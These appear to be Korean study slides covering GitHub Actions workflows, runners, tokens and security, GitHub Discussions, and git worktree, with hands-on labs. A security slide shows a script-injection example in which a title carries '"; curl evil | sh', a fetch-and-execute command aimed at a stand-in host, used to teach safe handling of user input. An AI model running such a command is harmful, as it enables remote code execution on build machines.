PART 1

GitHub Actions 소개

저장소에서 일어나는 일에 반응해 코드를 실행하는 GitHub 내장 자동화 플랫폼

What

GitHub Actions는 무엇인가

push, PR, 이슈, 스케줄 같은 이벤트가 생기면, 저장소에 적어 둔 워크플로를 GitHub가 준비한 러너에서 실행합니다.

CI

지속적 통합

커밋과 PR마다 빌드, 린트, 테스트를 돌려 깨진 코드가 main에 들어가지 않게 막습니다.

CD

지속적 배포

태그나 main 병합을 계기로 패키지 배포, 컨테이너 이미지 푸시, 웹사이트 배포를 합니다.

Ops

저장소 운영 자동화

이슈 라벨링, 오래된 이슈 정리, 릴리스 노트 작성, Discussions 공지 같은 반복 업무를 맡깁니다.

Why

왜 Actions를 쓰는가

  • 코드와 같은 곳에 산다. 워크플로는 .github/workflows/*.yml 파일이라 PR로 리뷰하고 이력을 남깁니다.
  • GitHub 이벤트를 그대로 쓴다. push, PR, 이슈, Discussions, 릴리스, 스케줄, 수동 실행까지 수십 종류.
  • 재사용 생태계. Marketplace의 액션을 uses: 한 줄로 가져다 씁니다.
  • 관리형 러너. Linux, Windows, macOS 머신을 GitHub가 제공하고, 필요하면 자체 서버도 붙입니다.
  • 비용. public 저장소의 표준 러너는 무료이고, private 저장소는 플랜별 무료 분량(Free 플랜 월 2,000분)이 있습니다.
  • 결과가 PR에 붙는다. 체크 상태, 로그, 요약, 아티팩트가 커밋과 PR 화면에 바로 보입니다.
Vocabulary

핵심 용어 6개

workflow

워크플로

자동화 한 단위. .github/workflows/ 안의 YAML 파일 하나가 워크플로 하나입니다.

on: event

이벤트

워크플로를 깨우는 계기. push, pull_request, schedule, workflow_dispatch 등.

jobs

잡

한 러너에서 실행되는 스텝 묶음. 잡끼리는 기본적으로 병렬로 돕니다.

steps

스텝

잡 안에서 순서대로 실행되는 명령(run)이나 액션(uses).

uses: owner/repo@ref

액션

재사용 가능한 스텝 패키지. 예: actions/checkout, actions/setup-node.

runs-on

러너

잡을 실제로 실행하는 머신. GitHub 호스팅 또는 자체 호스팅.

PART 2

Actions 구동원리

이벤트 하나가 로그와 체크 표시가 되기까지 무슨 일이 일어나는가

Run lifecycle

이벤트에서 결과까지

1 · event이벤트 발생push, PR 열림, Discussion 생성, cron 시각 도달
→
2 · match워크플로 매칭이벤트 커밋의 .github/workflows/*.yml 중 on: 조건이 맞는 것
→
3 · queueRun 생성잡 의존성(needs)을 보고 실행 가능한 잡을 큐에 넣음
→
4 · runner러너 배정잡마다 새 VM 또는 자체 러너가 잡을 가져가 스텝을 순서대로 실행
→
5 · report결과 보고체크 상태, 로그, 요약, 아티팩트가 커밋과 PR에 붙음
어느 브랜치의 YAML로 도나? 워크플로 파일도 코드라서 브랜치마다 내용이 다를 수 있습니다. push·pull_request는 그 브랜치에 있는 파일로 돌고, schedule·discussion·issues처럼 특정 브랜치와 상관없는 이벤트는 기본 브랜치(main)의 파일로 돕니다. 수동 실행(workflow_dispatch)은 Run workflow에서 고른 브랜치의 파일을 씁니다.
예시

feature 브랜치에서 05 환영 댓글 문구를 바꿔도, main에 병합하기 전에는 새 Discussion에 예전 문구가 달립니다. 수정한 파일이 main에 없기 때문입니다.

로그는 실시간

러너는 스텝 출력을 스트리밍하고, 잡이 끝나면 상태(성공, 실패, 취소, 건너뜀)를 GitHub에 보고합니다.

Anatomy

워크플로 YAML 해부

.github/workflows/ci.yml
name: CI                       # Actions 탭에 보일 이름
on:                            # 언제?
  push:
    branches: [main]
  pull_request:
permissions:                   # 토큰 권한 (최소로)
  contents: read
jobs:
  test:                        # 잡 ID
    runs-on: ubuntu-latest     # 어디서?
    steps:                     # 무엇을? (위에서 아래로)
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: npm test
on

트리거 목록. 여러 이벤트를 걸 수 있고 브랜치, 경로, 타입으로 거릅니다.

jobs.<id>.runs-on

러너 라벨. ubuntu-latest, windows-latest, macos-latest 또는 자체 러너 라벨.

steps[].uses / run

uses는 액션 호출, run은 셸 명령. with로 액션 입력값을 넘깁니다.

Runners

러너: 잡이 실제로 도는 곳

GitHub-hostedSelf-hosted
머신잡마다 새로 만든 VM, 끝나면 폐기내 서버, 사내망, GPU 머신 등에 러너 앱 설치
OSUbuntu, Windows, macOS (도구 대부분 미리 설치)원하는 OS와 하드웨어
관리GitHub가 패치·확장직접 업데이트하고 보안 관리
비용public 무료, private는 분 단위 과금Actions 사용료 없음, 인프라 비용은 본인
주의잡 사이에 파일이 남지 않음public 저장소에 붙이면 외부 PR 코드가 내 서버에서 돌 수 있음
핵심 같은 잡의 스텝들은 한 머신을 공유하지만, 잡끼리는 다른 머신입니다. 잡 사이에 결과를 넘기려면 outputs, 아티팩트, 캐시를 씁니다.
Job graph

잡은 기본 병렬, needs로 순서, matrix로 확장

jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [...]
  test:
    strategy:
      matrix:
        node: [20, 22, 24]
    runs-on: ubuntu-latest
    steps: [...]
  build:
    needs: [lint, test]
    steps: [...]
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    steps: [...]

성공실행 중대기

matrix 값 3개가 잡 3개로 펼쳐져 동시에 돕니다. build는 lint와 test 4개가 모두 성공해야 시작하고, deploy는 main 브랜치일 때만 실행됩니다.

Contexts & expressions

컨텍스트와 표현식 ${{ }}

env:
  APP_ENV: staging
steps:
  - id: ver
    run: echo "tag=v$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"
  - name: 이전 스텝 값 쓰기
    run: echo "${{ steps.ver.outputs.tag }}"
  - name: main에서만
    if: github.ref_name == 'main'
    run: ./deploy.sh
    env:

  - if: failure()
    run: echo "앞 스텝이 실패했을 때만 실행"
github.*이벤트, 저장소, 커밋, 실행자 정보
env.*워크플로·잡·스텝 단위 환경 변수
secrets.*저장소·환경에 등록한 비밀값, 로그에서 가려짐
steps.<id>.outputs$GITHUB_OUTPUT에 쓴 값
needs.<job>.outputs앞 잡이 내보낸 값
matrix.*, inputs.*matrix 조합, 수동 실행 입력값

표현식은 러너로 보내기 전에 GitHub가 문자열로 치환합니다. 그래서 사용자 입력을 run:에 직접 넣으면 위험합니다 (보안 슬라이드 참고).

GITHUB_TOKEN

자동 발급 토큰과 권한

  • 실행마다 GitHub가 GITHUB_TOKEN을 새로 발급하고, 잡이 끝나면 만료됩니다.
  • permissions: 블록으로 범위를 정합니다. 지정하지 않은 권한은 none이 됩니다.
  • 이 토큰으로 만든 push, 이슈, Discussion은 다른 워크플로를 깨우지 않습니다. 무한 루프를 막기 위한 규칙입니다.
  • 외부 서비스 키는 Settings → Secrets and variables → Actions에 등록하고 secrets.NAME으로 씁니다.
permissions:
  contents: read        # 코드 읽기
  pull-requests: write  # PR 코멘트
  discussions: write    # Discussions 쓰기
  pages: write          # Pages 배포
  id-token: write       # OIDC (클라우드 로그인)

steps:
  - run: gh pr comment 1 --body "LGTM"
    env:
      GH_TOKEN: ${{ github.token }}
Building blocks

액션 3종과 재사용 워크플로

JavaScript action

Node로 실행

action.yml + JS 코드. 시작이 가장 빠르고 세 OS 러너에서 모두 동작. 예: actions/checkout.

Docker container action

컨테이너로 실행

도구와 환경을 이미지에 고정. Linux 러너에서만 동작하고 이미지 준비 시간이 듭니다.

Composite action

스텝 묶음

여러 run/uses 스텝을 하나의 액션으로 포장. 사내 공통 셋업에 적합.

on: workflow_call

재사용 워크플로

잡 단위를 통째로 공유. jobs.x.uses: org/repo/.github/workflows/ci.yml@v1.

액션 버전은 @v4 같은 태그, 브랜치, 커밋 SHA로 지정합니다. 태그는 바뀔 수 있으므로 서드파티 액션은 SHA 고정을 권장합니다.

Security

보안 체크리스트

  • 최소 권한. 워크플로 맨 위에 permissions: contents: read를 두고 필요한 잡에만 더 줍니다.
  • 서드파티 액션 SHA 고정. uses: some/action@3f1c…처럼 커밋 해시로. Dependabot이 업데이트를 제안하게 둡니다.
  • pull_request_target 주의. 쓰기 권한과 시크릿이 있는 상태라 외부 PR 코드를 checkout해 실행하면 안 됩니다.
  • 스크립트 인젝션. 이슈 제목, Discussion 본문 같은 사용자 입력은 env:로 받아 변수로 씁니다.
위험: 제목에 "; curl evil | sh 가 들어오면 실행됨
- run: echo "${{ github.event.discussion.title }}"
안전: 값이 셸 코드가 아닌 변수로 전달됨
- env:
    TITLE: ${{ github.event.discussion.title }}
  run: echo "$TITLE"
PART 3

GitHub Discussions

저장소나 조직에 붙는 커뮤니티 포럼. 할 일이 아닌 대화를 위한 공간

What

Discussions는 무엇인가: Issues와 비교

IssuesDiscussions
목적해야 할 일: 버그, 기능 작업대화: 질문, 아이디어, 공지, 투표
끝맺음Close (완료 / 계획 없음)Q&A는 답변 채택, 나머지는 열린 채 유지 가능
구조평평한 댓글 목록댓글 + 한 단계 답글 스레드, 업보트
분류라벨, 마일스톤, 프로젝트카테고리(필수) + 라벨
연결PR로 닫기, 개발 브랜치Issue ↔ Discussion 서로 전환
APIREST + GraphQLGraphQL
나누는 기준 누군가 작업해서 닫아야 하는 것은 Issue, 여러 사람의 의견이 쌓여야 하는 것은 Discussion.
Categories

카테고리와 4가지 형식

Announcement

공지

메인테이너와 관리자만 새 글을 쓰고, 누구나 댓글을 답니다. 릴리스 안내에 적합.

Question / Answer

Q&A

댓글 하나를 답변으로 채택할 수 있고, 채택된 답이 글 상단에 고정됩니다.

Open-ended discussion

자유 토론

아이디어, 잡담, 쇼케이스처럼 결론이 필요 없는 대화.

Poll

투표

선택지를 두고 커뮤니티 의견을 모읍니다.

Discussions를 켜면 기본 카테고리 Announcements, General, Ideas, Polls, Q&A, Show and tell 이 생깁니다. 이름, 이모지, 형식은 바꿀 수 있고 섹션으로 묶을 수도 있습니다.

Features

운영에 쓰는 기능들

  • 답변 채택 Q&A에서 작성자나 메인테이너가 Mark as answer.
  • 업보트와 리액션 좋은 글과 댓글이 위로 올라옵니다.
  • 고정(Pin) 중요한 글을 목록 상단에 노출. 카테고리별 고정도 가능.
  • Issue ↔ Discussion 전환 질문으로 온 이슈를 Discussion으로, 확정된 아이디어를 Issue로.
  • 조직 Discussions 저장소 하나를 지정해 조직 전체 포럼으로 사용.
.github/DISCUSSION_TEMPLATE/q-a.yml (파일명 = 카테고리 slug)
title: "[질문] "
labels: ["question"]
body:
  - type: dropdown
    id: topic
    attributes:
      label: 주제
      options: [GitHub Actions, GitHub Discussions]
  - type: textarea
    id: question
    attributes:
      label: 질문 내용
    validations:
      required: true
How it works

Discussions 구동원리: 데이터 모델과 이벤트

Repository저장소Discussions 기능 on/off
→
DiscussionCategory카테고리형식(공지, Q&A 등)을 가짐
→
Discussion글번호, 제목, 본문, 라벨, 채택된 답변
→
DiscussionComment댓글업보트, 답변 여부
→
replies답글댓글 아래 한 단계

바뀔 때마다 이벤트가 나간다

discussion: created, edited, deleted, answered, unanswered, category_changed, labeled, pinned, locked, transferred 등

discussion_comment: created, edited, deleted

같은 이벤트가 Webhook과 Actions 트리거로 전달됩니다. Actions에서는 기본 브랜치의 워크플로가 실행됩니다.

읽고 쓰는 것은 GraphQL

조회: repository.discussions, discussionCategories

쓰기: createDiscussion, addDiscussionComment, markDiscussionCommentAsAnswer, updateDiscussion

ID는 숫자가 아닌 노드 ID(D_kwDO…)를 씁니다. 이벤트 페이로드의 node_id가 바로 그 값입니다.

PART 5

Git worktree

저장소 하나에 작업 폴더를 여러 개 붙여, 브랜치 여러 개를 동시에 펼쳐 놓고 일하는 방법

What & why

worktree는 무엇이고 왜 쓰는가

기능 개발 중에 급한 버그 수정이 들어오면 보통 stash나 임시 커밋 후 브랜치를 바꿉니다. worktree는 같은 저장소에 두 번째 작업 폴더를 만들어 다른 브랜치를 그대로 열어 둡니다.

hotfix

긴급 수정

하던 작업을 건드리지 않고 옆 폴더에서 main 기준 핫픽스 브랜치를 만들어 PR을 올립니다.

review

PR 리뷰와 비교

동료의 PR 브랜치를 별도 폴더에 열어 실행해 보고, 내 브랜치와 나란히 비교합니다.

parallel

병렬 작업

긴 빌드·테스트를 한 폴더에서 돌리는 동안 다른 폴더에서 계속 작업합니다. AI 코딩 에이전트 여러 개를 폴더별로 격리해 돌릴 때도 씁니다.

How it works

구동원리: 저장소는 하나, 작업 공간은 여러 개

~/study/                       # 메인 worktree
├── .git/                      # 진짜 저장소
│   ├── objects/               # 커밋·파일 (공유)
│   ├── refs/heads/            # 브랜치 (공유)
│   ├── config                 # 설정 (공유)
│   ├── HEAD, index            # 메인 worktree 전용
│   └── worktrees/
│       └── hotfix/            # 추가 worktree 전용 상태
│           ├── HEAD
│           ├── index
│           └── gitdir
└── slides/ ...

~/study-hotfix/                # 추가(linked) worktree
├── .git                       # 폴더가 아닌 "파일"
│   # gitdir: ~/study/.git/worktrees/hotfix
└── slides/ ...
공유

커밋 객체, 브랜치·태그, 원격 설정, stash. 한쪽에서 커밋하면 다른 쪽에서 git log로 바로 보입니다.

worktree마다 따로

체크아웃된 파일, HEAD, 스테이징 영역(index), 진행 중인 merge·rebase 상태.

규칙 한 브랜치는 한 worktree에서만 체크아웃할 수 있습니다. 두 곳에서 같은 브랜치를 고치다 서로 덮어쓰는 일을 막기 위해서입니다.
Commands

자주 쓰는 명령어

# main을 기준으로 새 브랜치 + 새 폴더
git worktree add -b hotfix/typo ../study-hotfix main

# 이미 있는 브랜치를 폴더로 열기 (PR 리뷰)
git fetch origin lab2-break
git worktree add ../study-review lab2-break

# 목록 보기
git worktree list
# ~/study          a82d0dc [main]
# ~/study-hotfix   a82d0dc [hotfix/typo]
# ~/study-review   5c1e9f2 [lab2-break]

# 다 쓴 worktree 정리
git worktree remove ../study-review
git worktree prune     # 폴더를 직접 지웠을 때 기록 정리
add폴더를 만들고 브랜치를 체크아웃
list모든 worktree와 브랜치, 커밋
remove폴더와 기록 삭제 (변경이 있으면 거부)
prune사라진 폴더의 기록 정리
lock외장 디스크 등 정리 대상에서 보호
move, repair폴더 이동, 끊어진 연결 복구

폴더 이름은 보통 저장소 옆에 저장소-브랜치 형태로 둡니다. 저장소 안쪽에 만들면 git status에 잡히니 피하세요.

Compare

stash, clone, worktree 비교

stash 후 브랜치 전환clone 하나 더worktree
동시에 열린 브랜치1개여러 개여러 개
저장소 데이터1벌clone마다 1벌 (디스크·네트워크 ×N)1벌을 공유
브랜치·커밋 공유-push·fetch로만즉시
하던 작업stash에 넣었다 꺼내야 함그대로그대로
빌드 산출물전환마다 재빌드가 잦음폴더마다 따로폴더마다 따로
요약 잠깐 바꿔 보는 것이면 git switch, 오래 나란히 열어 둘 거면 worktree, 완전히 다른 설정이 필요하면 clone.

Pitfalls & try it

주의할 점과 직접 해 보기

  • 같은 브랜치 중복 불가. already checked out 오류가 나면 다른 worktree에서 그 브랜치를 쓰고 있는 것입니다.
  • 폴더를 그냥 지우지 말 것. git worktree remove를 쓰고, 이미 지웠다면 git worktree prune.
  • 의존성은 폴더마다. node_modules, 빌드 캐시는 worktree마다 새로 설치됩니다.
  • submodule이 있는 저장소는 지원이 제한적이니 공식 문서의 주의 사항을 확인하세요.

Hello Actions: 수동 실행과 로그 읽기

on:
  workflow_dispatch:
    inputs:
      who:
        description: 인사할 대상
        default: 스터디원
jobs:
  hello:
    runs-on: ubuntu-latest
    steps:
      - name: 인사하기
        env:
          WHO: ${{ inputs.who || '스터디원' }}
        run: echo "안녕하세요, ${WHO}님!"
      - name: 실행 정보 보기
        run: |
          echo "이벤트:  ${{ github.event_name }}"
          echo "러너 OS: $RUNNER_OS"
      - run: echo "### ${{ github.actor }}" >> "$GITHUB_STEP_SUMMARY"
  1. Actions → 01 Hello Actions → Run workflow, who 에 내 이름 입력.

  1. Lab 5가 끝나 Discussions가 켜져 있어야 합니다.
  2. General 카테고리에 아무 글이나 올립니다.
  3. Actions 탭에서 05 Discussion 환영 댓글 실행을 확인합니다.
  4. 글로 돌아가 github-actions 봇의 댓글을 확인합니다.
  5. 과제 types에 answered를 추가하고, 답변이 채택되면 감사 댓글을 달도록 바꿔 봅니다. 힌트: github.event.action
LAB 7

워크플로로 공지 Discussion 게시하기

- name: 저장소와 카테고리 ID 조회
  id: ids
  run: |
    gh api graphql -f query='query($owner: String!, $name: String!) {
      repository(owner: $owner, name: $name) {
        id
        discussionCategories(first: 25) { nodes { id name } }
      }
    }' -f owner="$OWNER" -f name="$NAME" > repo.json
    REPO_ID=$(jq -r '.data.repository.id' repo.json)
    echo "repo=$REPO_ID" >> "$GITHUB_OUTPUT"
    ...
- name: Discussion 만들기
  run: |
    gh api graphql -f query='mutation($repo: ID!, $cat: ID!,
        $title: String!, $body: String!) {
      createDiscussion(input: {repositoryId: $repo,
        categoryId: $cat, title: $title, body: $body}) {
        discussion { url }
      }
    }' -f repo="$REPO_ID" -f cat="$CAT_ID" ...
  1. Actions → 06 공지 Discussion 게시 → Run workflow. 제목과 본문을 입력합니다.
  2. 실행 Summary에 찍힌 URL로 Announcements의 새 글을 엽니다.
  3. 관찰 Lab 6의 환영 댓글 워크플로가 이번에는 실행되지 않습니다. GITHUB_TOKEN으로 만든 이벤트는 다른 워크플로를 깨우지 않기 때문입니다.
  4. 과제 트리거를 release: types: [published] 로 바꾸고 릴리스 본문을 공지 본문으로 써 보세요.
Troubleshooting

막혔을 때 먼저 볼 것

증상원인과 해결
Run workflow 버튼이 없다workflow_dispatch 가 있는 파일이 기본 브랜치에 있어야 버튼이 나타납니다.
Fork에서 아무것도 안 돈다Fork는 워크플로가 꺼져 있습니다. Actions 탭에서 활성화하세요.
Resource not accessible by integration토큰 권한 부족. permissions: 에 필요한 범위(예: discussions: write)를 추가합니다.
Pages 배포가 실패한다Settings → Pages의 Source가 GitHub Actions 인지 확인합니다.
Discussion 워크플로가 안 돈다Discussions가 꺼져 있거나, 워크플로 파일이 기본 브랜치에 없거나, 글을 봇 토큰으로 만들었습니다.
카테고리를 찾지 못했다입력한 카테고리 이름이 화면의 이름과 정확히 같은지(대소문자 포함) 확인합니다.
